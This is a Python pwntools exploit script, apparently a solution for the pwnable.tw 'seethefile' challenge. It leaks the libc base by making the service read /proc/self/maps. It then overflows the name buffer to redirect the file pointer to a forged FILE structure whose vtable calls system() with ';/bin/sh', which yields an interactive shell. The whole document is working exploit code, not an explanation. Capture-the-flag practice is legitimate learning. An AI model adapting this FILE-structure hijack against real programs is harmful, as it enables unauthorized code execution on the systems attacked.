from pwn import *
import subprocess
context.arch = 'i386'
context.terminal = ["tmux","splitw","-h"]
def choice(io,ch):
    io.recvuntil(b"Your choice :")
    io.sendline(str(ch).encode())

def openfile(io,filename):
    choice(io,1)
    io.recvuntil(b"What do you want to see :")
    io.sendline(filename)

def readfile(io):
    choice(io,2)

def writefile(io):
    choice(io,3)
    return io.recvuntil(b"---------------MENU---------------")

def closefile(io):
    choice(io,4)

def Name(io,name):
    choice(io,5)
    io.recvuntil(b"Leave your name :")
    io.sendline(name)

def fake_file_and_vtable(_bin,system_addr):
    file_start = _bin.symbols["fp"] + 4
    filestr = FileStructure()
    filestr._lock = _bin.symbols['filename']+0x20
    filestr.vtable = file_start + len(filestr) - 8
    filestr.flags = (~0x2000 & 0xffffffff)
    filestr._IO_read_ptr = b";/bi"
    filestr._IO_read_end = b"n/sh"
    filestr._IO_read_base = b";aaa"
    vtable = p32(system_addr)
    
    return bytes(filestr) + vtable
    # return b"/bin/sh;" + bytes(filestr)[8:].replace(b"\00",b"a") + vtable
    
def get_libc_base(pid):
    cmd = f"cat /proc/{pid}/maps" + " | grep libc | head -1 | awk -F- {'print $1'}"
    out = subprocess.check_output(cmd,shell=True)
    return int(out,16)

def leak_libc(io):
    openfile(io,"/proc/self/maps")
    readfile(io)
    readfile(io)
    s = writefile(io).split(b"\n")
    for line in s:
        if b"libc" in line:
            return int(line[:8].decode(),16)

DEBUG = False
if __name__=='__main__':
    if DEBUG:
        io = process("./seethefile")
        libc_addr = get_libc_base(pidof(io)[0])
    else:
        io = remote("chall.pwnable.tw",10200)
    

    _bin = ELF('./seethefile')
    libc = ELF("./libc_32.so.6")
    libc.address= leak_libc(io)
    success(f"leaked libc: {hex(libc.address)}")
    file_str = fake_file_and_vtable(_bin, libc.symbols["system"])
    Name(io,b"a"*0x20 + p32(0x804b284) + file_str)
    io.interactive()